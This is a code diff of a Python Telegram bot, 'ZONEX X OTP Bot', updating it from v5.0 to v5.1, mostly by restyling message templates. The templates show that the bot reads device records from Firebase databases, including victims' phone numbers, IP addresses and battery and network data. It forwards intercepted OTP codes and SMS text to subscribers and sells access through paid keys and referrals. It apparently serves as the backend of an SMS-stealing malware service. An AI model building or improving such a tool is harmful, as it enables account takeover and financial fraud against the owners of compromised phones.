@@ -1,11 +1,8 @@
-
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════╗
-║        ZONEX X OTP BOT v5.0              ║
-║  Channel Gate · Key Entry · Time Plans   ║
-║  Referral · Multi-Firebase · Admin Panel ║
-║  FIX: Only Real Phone Numbers in List    ║
+║        ZONEX X OTP BOT v5.1              ║
+║  Premium UI Update                       ║
 ╚══════════════════════════════════════════╝
 """
 
@@ -341,7 +338,6 @@ def _normalize_phone(ph) -> str:
 def _has_valid_phone(info: dict) -> bool:
     if not isinstance(info, dict):
         return False
-    # Har possible key check karo
     raw = (
         info.get("phone") or info.get("mobNo") or info.get("phoneNumber")
         or info.get("mobile") or info.get("Mobile") or info.get("phone_number")
@@ -353,7 +349,6 @@ def _has_valid_phone(info: dict) -> bool:
     norm = _normalize_phone(raw)
     if norm == "—":
         return False
-    # Kam se kam 10 digit ka number hona chahiye
     if len(re.sub(r"\D", "", norm)) < 10:
         return False
     return True
@@ -372,7 +367,6 @@ def _extract_phone(info: dict) -> str:
             if n != "—":
                 return n
                 
-    # Nested sims check
     sims = info.get("sims") or {}
     sim_list = sims if isinstance(sims, list) else list(sims.values())
     for sim in sim_list:
@@ -385,7 +379,6 @@ def _extract_phone(info: dict) -> str:
                 if n != "—":
                     return n
                     
-    # Nested dicts check
     for k, v in info.items():
         if isinstance(v, dict):
             for kk in keys:
@@ -420,13 +413,12 @@ def _build_device_record(info: dict, dev_id: str) -> dict:
     fb_online = _is_online_fb(info)
     is_online = bool(fb_online)
     
-    # Agar phone valid hai, tabhi online count hoga
     display_online = is_online and phone_ok
     
     ts_raw = (info.get("lastSeen") or info.get("last_seen")
               or info.get("lastOnline") or info.get("last_online") or "")
     return {
-        "online":    display_online, # Only count if phone is valid
+        "online":    display_online,
         "has_phone": phone_ok,
         "phone":     phone, 
         "name":      str(info.get("modelName") or info.get("model")
@@ -647,22 +639,31 @@ def fmt_ts(ts) -> str:
     except: pass
     return "—"
 
-# ─── Text builders ────────────────────────────────────────────────────────────
+# ══════════════════════════════════════════════════════════════════════════════
+#  ★★★ TEXT BUILDERS (PREMIUM UI) ★★★
+# ══════════════════════════════════════════════════════════════════════════════
+
 def txt_welcome_panel(name: str, uid: int) -> str:
     tl  = time_left_str(uid)
     on  = count_online()
     otp = count_otps()
-    dbs = len(data['firebase_configs'])
+    status = "✅ Active" if has_access(uid) else "❌ Expired"
+    
     return (
-        f"🤖 <b>ZONEX X OTP Bot</b>\n"
-        f"{'━'*28}\n\n"
-        f"👋 Hey, <b>{name}!</b>\n"
-        f"⏱ Access  ›  <b>{tl}</b>\n\n"
-        f"<b>📡 Live Status</b>\n"
-        f"  ├ 🟢 Online   <code>{on}</code> device{'s' if on!=1 else ''}\n"
-        f"  ├ 🔑 OTPs     <code>{otp}</code>\n"
-        f"  └ 🔥 Firebase  <code>{dbs}</code> DB\n\n"
-        f"<i>🕐 Last sync: {last_refresh}  ·  auto {AUTO_REFRESH}s</i>"
+        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+        f"🤖 <b>𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏 𝐁𝐎𝐓</b>\n"
+        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+        f"👋 Welcome, <b>{name}</b>!\n\n"
+        f"╭──────────────────────╮\n"
+        f"⏱️ <b>𝐀𝐂𝐂𝐄𝐒𝐒</b>  ›  {tl}\n"
+        f"🟢 <b>𝐒𝐓𝐀𝐓𝐔𝐒</b>   ›  {status}\n"
+        f"╰──────────────────────╯\n\n"
+        f"╭━━━ 📡 <b>𝐋𝐈𝐕𝐄 𝐒𝐓𝐀𝐓𝐒</b> ━━━╮\n"
+        f"🟢 Online      › {on}\n"
+        f"🔑 Total OTPs  › {otp}\n"
+        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+        f"🕐 Last Sync  › {last_refresh}\n"
+        f"🔄 Auto Refresh › {AUTO_REFRESH}s"
     )
 
 def txt_device_card(label: str, dev_id: str) -> str:
@@ -676,41 +677,49 @@ def txt_device_card(label: str, dev_id: str) -> str:
     last_seen = str(info.get('last_seen','—'))
 
     header = (
-        f"📱 <b><code>{phone}</code></b>  <i>(tap to copy)</i>\n"
-        f"{'━'*28}\n"
-        f"🔋 Battery  ›  <code>{battery}</code>\n"
-        f"🤖 Android  ›  <code>{android}</code>\n"
-        f"📡 Network  ›  <code>{network}</code>\n"
-        f"🌐 IP       ›  <code>{ip}</code>\n"
-        f"🕐 Last Seen›  <code>{last_seen}</code>\n"
-        f"🔥 DB       ›  <code>{label}</code>\n\n"
-        f"<b>🔑 Latest OTP</b>\n{'─'*28}"
+        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+        f"📱 <b>𝐃𝐄𝐕𝐈𝐂𝐄 𝐈𝐍𝐅𝐎</b>\n"
+        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+        f"╭──────────────────────╮\n"
+        f"📞 Number   › <code>{phone}</code>\n"
+        f"🔋 Battery  › {battery}\n"
+        f"🤖 Android  › {android}\n"
+        f"📡 Network  › {network}\n"
+        f"🌐 IP       › {ip}\n"
+        f"🕐 Last Seen › {last_seen}\n"
+        f"🔥 Database › {label}\n"
+        f"╰──────────────────────╯\n\n"
+        f"╭━━━ 🔑 <b>𝐋𝐀𝐓𝐄𝐒𝐓 𝐎𝐓𝐏</b> ━━━╮\n"
     )
     lines = [header]
     if otps:
         e = otps[0]
         lines.append(
-            f"\n  ⚡ <b><code>{e['otp']}</code></b>\n"
-            f"  📤 <i>{e['sender']}</i>\n"
-            f"  🕐 {e['time']}"
+            f"⚡ CODE   › <b><code>{e['otp']}</code></b>\n"
+            f"📤 Sender › {e['sender']}\n"
+            f"🕐 Time   › {e['time']}\n"
+            f"╰━━━━━━━━━━━━━━━━━━━━━━╯"
         )
     else:
-        lines.append("\n  ❌ <i>Koi recent OTP nahi mila</i>")
+        lines.append(
+            f"❌ <i>Koi recent OTP nahi mila</i>\n"
+            f"╰━━━━━━━━━━━━━━━━━━━━━━╯"
+        )
     return "".join(lines)
 
 def txt_otp_alert(label: str, dev_id: str, e: dict, info: dict) -> str:
     return (
-        f"⚡ <b>OTP ALERT</b> ⚡\n"
-        f"{'━'*30}\n\n"
+        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+        f"⚡ <b>𝐎𝐓𝐏 𝐀𝐋𝐄𝐑𝐓</b> ⚡\n"
+        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
         f"🔢  <b><code>{e['otp']}</code></b>\n\n"
-        f"{'━'*30}\n"
-        f"📞 <code>{info.get('phone','—')}</code>\n"
-        f"📤 {e['sender']}\n"
-        f"🕐 {e['time']}\n"
-        f"{'─'*30}\n"
-        f"💬 <i>{e['msg'][:200]}{'…' if len(e['msg'])>200 else ''}</i>\n"
-        f"{'━'*30}\n"
-        f"🤖 <b>ZONEX X OTP Bot</b>  ·  {BOT_DEV}"
+        f"╭──────────────────────╮\n"
+        f"📞 Number › <code>{info.get('phone','—')}</code>\n"
+        f"📤 Sender › {e['sender']}\n"
+        f"🕐 Time   › {e['time']}\n"
+        f"╰──────────────────────╯\n\n"
+        f"💬 <i>{e['msg'][:200]}{'…' if len(e['msg'])>200 else ''}</i>\n\n"
+        f"🤖 <b>ZONEX X OTP Bot</b> · {BOT_DEV}"
     )
 
 def txt_user_panel(uid: int) -> str:
@@ -720,38 +729,18 @@ def txt_user_panel(uid: int) -> str:
     rh   = get_referral_hours()
     tl   = time_left_detailed(uid)
     return (
-        f"🔑 <b>KEY SYSTEM</b>\n"
-        f"{'━'*28}\n\n"
+        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+        f"🔑 <b>𝐊𝐄𝐘 𝐒𝐘𝐒𝐓𝐄𝐌</b>\n"
+        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
         f"🆔 User ID\n"
         f"   <code>{uid}</code>\n\n"
         f"⏱ Access Status\n"
         f"   <b>{tl}</b>\n\n"
         f"🗝 Permanent Key\n"
         f"   <code>{key}</code>\n\n"
-        f"👥 Referrals  ›  <b>{refs}</b>  <i>(+{int(refs*rh)}h earned)</i>\n"
-        f"{'─'*28}\n"
+        f"👥 Referrals  ›  <b>{refs}</b>  <i>(+{int(refs*rh)}h earned)</i>\n\n"
         f"<i>Key kabhi nahi badlegi — sirf tumhari hai 🔒</i>"
     )
-
-def txt_plans() -> str:
-    plans = data.get("pricing_plans",[])
-    upi   = data.get("upi_id","")
-    if not plans:
-        return f"💰 Koi plan nahi hai abhi.\n👑 Contact: {ADMIN_USERNAME}"
-    lines = ["💰 <b>Buy Key — Plans</b>\n","━"*28,"\n\n"]
-    for p in plans:
-        h = int(p['hours'])
-        if h >= 720: dur = f"{h//720} Month"
-        elif h >= 168: dur = f"{h//168} Week"
-        elif h >= 24: dur = f"{h//24} Din"
-        else: dur = f"{h}h"
-        lines.append(f"📦 <b>{dur}</b>  —  ⏱{h}h  —  💵 <b>₹{p['price']}</b>\n")
-    lines.append(f"\n{'─'*28}\n")
-    if upi:
-        lines.append(f"💳 <b>UPI ID:</b> <code>{upi}</code>\n\n")
-    lines += [f"<i>Payment ke baad admin ko screenshot bhejo.</i>\n",
-              f"👑 {ADMIN_USERNAME}"]
-    return "".join(lines)
 
 def txt_stats() -> str:
     active = sum(1 for s, u in data["users"].items() if has_access(int(s)))
@@ -759,8 +748,9 @@ def txt_stats() -> str:
     tot    = count_total()
     otp    = count_otps()
     return (
-        f"📊 <b>System Stats</b>\n"
-        f"{'━'*28}\n\n"
+        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+        f"📊 <b>𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐒</b>\n"
+        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
         f"<b>Devices</b>\n"
         f"  ├ 🟢 Online    <code>{on}</code>\n"
         f"  └ 📱 Total     <code>{tot}</code>\n\n"
@@ -776,16 +766,23 @@ def txt_stats() -> str:
 def txt_expired(name: str) -> str:
     rh = get_referral_hours()
     return (
-        f"⏰ <b>Access Khatam!</b>\n"
-        f"{'━'*28}\n\n"
-        f"Arre <b>{name}</b>, tumhara time khatam ho gaya! 😔\n\n"
-        f"<b>Wapas aane ke 2 tarike:</b>\n\n"
-        f"💰 <b>Buy Key</b>\n"
-        f"   Plan kharido, turant access milega\n\n"
-        f"👥 <b>Refer & Earn</b>\n"
-        f"   Ek dost = FREE <b>+{rh:.0f}h</b> access! Bilkul free!\n"
-        f"{'─'*28}\n"
-        f"<i>Refer link ke liye 👇 button dabao</i>"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"⏰ <b>𝐀𝐂𝐂𝐄𝐒𝐒 𝐄𝐗𝐏𝐈𝐑𝐄𝐃</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"😔 Arre <b>{name}</b>,\n"
+        f"   tumhara time khatam ho gaya!\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"💎 <b>𝐂𝐇𝐎𝐎𝐒𝐄 𝐘𝐎𝐔𝐑 𝐎𝐏𝐓𝐈𝐎𝐍</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"💰 <b>𝐁𝐔𝐘 𝐊𝐄𝐘</b>\n"
+        f"   Plan kharido, turant access milega.\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👥 <b>𝐑𝐄𝐅𝐄𝐑 & 𝐄𝐀𝐑𝐍</b>\n"
+        f"   Ek dost = FREE +{rh:.0f} hour access! 🎁\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🔗 Refer link ke liye 👇\n"
+        f"   neeche button dabao!\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━"
     )
 
 def get_referral_hours() -> float:
@@ -1019,9 +1016,11 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     all_joined, missing = await check_channels(ctx.bot, uid)
     if not all_joined:
         await update.message.reply_text(
-            f"🤖 <b>ZONEX X OTP Bot</b>\n"
-            f"{'━'*28}\n\n"
-            f"👋 <b>Welcome {name}!</b>\n\n"
+            f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+            f"🤖  <b>𝐙𝐎𝐍𝐄𝐗 𝐗 𝐎𝐓𝐏 𝐁𝐎𝐓</b>\n"
+            f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+            f"👋 Welcome <b>{name}</b>!\n\n"
+            f"🔒 <b>𝐁𝐎𝐓 𝐀𝐂𝐂𝐄𝐒𝐒 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃</b>\n\n"
             f"Bot use karne ke liye pehle\n"
             f"yeh channels join karo 👇",
             parse_mode="HTML",
@@ -1046,9 +1045,14 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             try:
                 await ctx.bot.send_message(
                     ref_uid,
-                    f"🎉 <b>Referral Bonus!</b>\n\n"
-                    f"Tumhare referral <b>{name}</b> ne join kar liya!\n"
-                    f"⏱ <b>+{rh:.0f} Hour</b> add hua tumhare account mein!",
+                    f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+                    f"🎉  <b>𝐑𝐄𝐅𝐄𝐑𝐑𝐀𝐋 𝐁𝐎𝐍𝐔𝐒</b>\n"
+                    f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+                    f"✅ Referral Joined Successfully!\n"
+                    f"⏱️ Bonus Added › +{rh:.0f} hour\n\n"
+                    f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                    f"🎁 <b>𝐅𝐑𝐄𝐄 𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃!</b>\n"
+                    f"⚡ +{rh:.0f} hour Added to Your Account",
                     parse_mode="HTML"
                 )
             except: pass
@@ -1219,9 +1223,14 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 try:
                     await ctx.bot.send_message(
                         ref_uid,
-                        f"🎉 <b>Referral Bonus!</b>\n\n"
-                        f"Tumhara referral join ho gaya!\n"
-                        f"⏱ <b>+{rh:.0f} Hour</b> add hua!",
+                        f"╭━━━━━━━━━━━━━━━━━━━━━━╮\n"
+                        f"🎉  <b>𝐑𝐄𝐅𝐄𝐑𝐑𝐀𝐋 𝐁𝐎𝐍𝐔𝐒</b>\n"
+                        f"╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
+                        f"✅ Referral Joined Successfully!\n"
+                        f"⏱️ Bonus Added › +{rh:.0f} hour\n\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                        f"🎁 <b>𝐅𝐑𝐄𝐄 𝐀𝐂𝐂𝐄𝐒𝐒 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃!</b>\n"
+                        f"⚡ +{rh:.0f} hour Added to Your Account",
                         parse_mode="HTML"
                     )
                 except: pass
@@ -2562,7 +2571,7 @@ async def _on_startup(app):
 def main():
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!"); return
-    logger.info("🚀 ZONEX X OTP Bot v5.0 starting...")
+    logger.info("🚀 ZONEX X OTP Bot v5.1 starting...")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channels: {CHANNELS}")
     logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
